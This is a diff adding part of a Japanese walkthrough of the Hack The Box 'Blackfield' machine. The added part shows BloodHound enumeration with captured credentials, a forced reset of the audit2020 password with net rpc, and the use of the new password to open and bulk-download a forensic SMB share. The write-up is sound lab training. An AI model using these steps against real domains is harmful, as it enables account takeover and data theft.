@@ -98,7 +98,72 @@ supportのクリデンシャルを使ってbloodhoundを実行する。
 └─$ bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all
 ```
 
+![hound-1](https://user-images.githubusercontent.com/85237728/198561622-a9cc4ee3-d39c-4b3c-bdee-154184de7fe7.png)
 
+supportはaudit2020のパスワードを設定することができると判明（audit2020の現在のパスワードを知らなくても変更可能）。
+
+そこで、audit2020のパスワードをPassw0rd2020に設定する：
+
+```
+┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
+└─$ net rpc password audit2020 -U support -S 10.10.10.192
+Enter new password for audit2020:
+Password for [WORKGROUP\support]:
+```
+（コロンの次に入力した文字は表示されない）
+
+audit2020のクリデンシャルでforensicというSMBシェアへアクセスする：
+
+```
+┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
+└─$ smbclient -U 'audit2020%Passw0rd2020' //10.10.10.192/forensic
+Try "help" to get a list of possible commands.
+smb: \>
+```
+
+次のように、怪しいtxtファイルがある：
+
+```
+smb: \> dir
+  .                                   D        0  Sun Feb 23 22:03:16 2020
+  ..                                  D        0  Sun Feb 23 22:03:16 2020
+  commands_output                     D        0  Mon Feb 24 03:14:37 2020
+  memory_analysis                     D        0  Fri May 29 05:28:33 2020
+  tools                               D        0  Sun Feb 23 22:39:08 2020
+
+		5102079 blocks of size 4096. 1672550 blocks available
+smb: \> cd commands_output\
+smb: \commands_output\> dir
+  .                                   D        0  Mon Feb 24 03:14:37 2020
+  ..                                  D        0  Mon Feb 24 03:14:37 2020
+  domain_admins.txt                   A      528  Sun Feb 23 22:00:19 2020
+  domain_groups.txt                   A      962  Sun Feb 23 21:51:52 2020
+  domain_users.txt                    A    16454  Sat Feb 29 07:32:17 2020
+  firewall_rules.txt                  A   518202  Sun Feb 23 21:53:58 2020
+  ipconfig.txt                        A     1782  Sun Feb 23 21:50:28 2020
+  netstat.txt                         A     3842  Sun Feb 23 21:51:01 2020
+  route.txt                           A     3976  Sun Feb 23 21:53:01 2020
+  systeminfo.txt                      A     4550  Sun Feb 23 21:56:59 2020
+  tasklist.txt                        A     9990  Sun Feb 23 21:54:29 2020
+```
+
+すべてダウンロードする：
+
+```
+smb: \commands_output\> mask ""
+smb: \commands_output\> recurse ON
+smb: \commands_output\> prompt OFF
+smb: \commands_output\> mget *
+getting file \commands_output\domain_admins.txt of size 528 as domain_admins.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+getting file \commands_output\domain_groups.txt of size 962 as domain_groups.txt (1.1 KiloBytes/sec) (average 0.7 KiloBytes/sec)
+getting file \commands_output\domain_users.txt of size 16454 as domain_users.txt (15.7 KiloBytes/sec) (average 5.5 KiloBytes/sec)
+getting file \commands_output\firewall_rules.txt of size 518202 as firewall_rules.txt (183.1 KiloBytes/sec) (average 88.2 KiloBytes/sec)
+getting file \commands_output\ipconfig.txt of size 1782 as ipconfig.txt (1.1 KiloBytes/sec) (average 70.3 KiloBytes/sec)
+getting file \commands_output\netstat.txt of size 3842 as netstat.txt (2.4 KiloBytes/sec) (average 58.7 KiloBytes/sec)
+getting file \commands_output\route.txt of size 3976 as route.txt (3.8 KiloBytes/sec) (average 53.1 KiloBytes/sec)
+getting file \commands_output\systeminfo.txt of size 4550 as systeminfo.txt (4.3 KiloBytes/sec) (average 48.6 KiloBytes/sec)
+getting file \commands_output\tasklist.txt of size 9990 as tasklist.txt (9.5 KiloBytes/sec) (average 45.3 KiloBytes/sec)
+```
 
 
 
